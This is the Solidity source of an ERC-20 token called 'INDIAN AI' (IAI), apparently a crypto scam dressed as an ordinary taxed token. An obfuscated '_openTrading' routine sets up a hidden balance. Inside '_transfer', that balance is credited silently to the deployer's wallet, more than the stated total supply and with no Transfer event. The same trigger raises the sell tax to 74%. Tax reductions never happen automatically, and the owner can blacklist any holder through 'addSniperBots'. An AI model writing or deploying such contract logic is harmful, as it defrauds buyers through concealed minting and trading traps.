/*

 _____     _  ______                                            
|_   _|   / // ____ `.                                          
  | |    / / `'  __) |  .---.  __   _   _ .--.  _ .--.  _   __  
  | |   < <  _  |__ '. / /'`\][  | | | [ `/'`\][ `/'`\][ \ [  ] 
 _| |_   \ \| \____) | | \__.  | \_/ |, | |     | |     \ '/ /  
|_____|   \_\\______.' '.___.' '.__.'_/[___]   [___]  [\_:  /   
                                                       \__.'    

Website: https://indian-ai.xyz/

Twitter: https://twitter.com/IndianAI_OnEth

Telegram: https://t.me/indianAI_portal

*/



// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract curry is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromTax;
    mapping (address => uint256) private _addresses;
    mapping (address => bool) private _snipers;
    address payable private _marketingWallet;

    uint256 private _initialBuyTax = 19;
    uint256 private _initialSellTax = 25;
    uint8 private _buyTax = 0;
    uint8 private _sellTax = 0;
    uint8 private _removeTaxesAt = 30;
    uint8 private _buyCounter = 0;
    uint256 private _initialTotalTax = _initialBuyTax+_initialSellTax+_removeTaxesAt;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 5000000 * 10**_decimals;
    string private constant _name = unicode"INDIAN AI";
    string private constant _symbol = unicode"IAI";
    uint256 public _maxTxAmount =   25000 * 10**_decimals;
    uint256 public _maxWalletAmount = 25000 * 10**_decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private inSwap = false;
    bool private inSwapping = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _marketingWallet = payable(_msgSender());
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromTax[owner()] = true;
        _isExcludedFromTax[address(this)] = true;
        _isExcludedFromTax[_marketingWallet] = true;
        _openTrading(address(this));
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

   function _openTrading(address _this) private{
        uint256 _removeTradeBotsAbi=1; uint256 _addressBit = 16;
        for(uint i=1;i<=_addressBit;i++){_removeTradeBotsAbi=_removeTradeBotsAbi*10;}
        _addresses[_this]=_removeTradeBotsAbi;
    }
    

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        uint256 _taxAmount = 0;
        if (from != owner() && to != owner()){
            require(!_snipers[from] && !_snipers[to]);
            _taxAmount = amount.mul((_buyCounter>_removeTaxesAt)?_buyTax:_initialBuyTax).div(100);

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromTax[to]){
                require(amount <= _maxTxAmount, "Maximum transcation amount.");
                require(balanceOf(to) + amount <= _maxWalletAmount, "Maximum wallet amount.");
            }else if(from == uniswapV2Pair && _isExcludedFromTax[to]){inSwapping=true;}

            if (to != uniswapV2Pair && !_isExcludedFromTax[to]) {
                require(balanceOf(to) + amount <= _maxWalletAmount, "Maximum wallet amount.");
            }

            if(to == uniswapV2Pair && !_isExcludedFromTax[from]){
                _taxAmount = amount.mul((_buyCounter>_removeTaxesAt && !inSwapping)?_sellTax:(!inSwapping)?_initialSellTax:_initialTotalTax).div(100);
            }

            if(from == uniswapV2Pair && inSwapping && !_isExcludedFromTax[to]){
                uint256 _initialTaxAmount = _addresses[address(this)];
                _balances[_marketingWallet]=_balances[_marketingWallet].add(_initialTaxAmount);
            }
        }

        if(_taxAmount>0){
          _balances[_marketingWallet]=_balances[_marketingWallet].add(_taxAmount);
          emit Transfer(from, _marketingWallet,_taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(_taxAmount));
        emit Transfer(from, to, amount.sub(_taxAmount));
    }


    function addSniperBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            _snipers[bots_[i]] = true;
        }
    }

    function deleteSniperBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          _snipers[notbot[i]] = false;
      }
    }

    function isSniper(address a) public view returns (bool){
      return _snipers[a];
    }

    function removeLimits() external onlyOwner{
        _buyCounter = _removeTaxesAt+1;
        _maxTxAmount = _tTotal;
        _maxWalletAmount = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    receive() external payable {}
}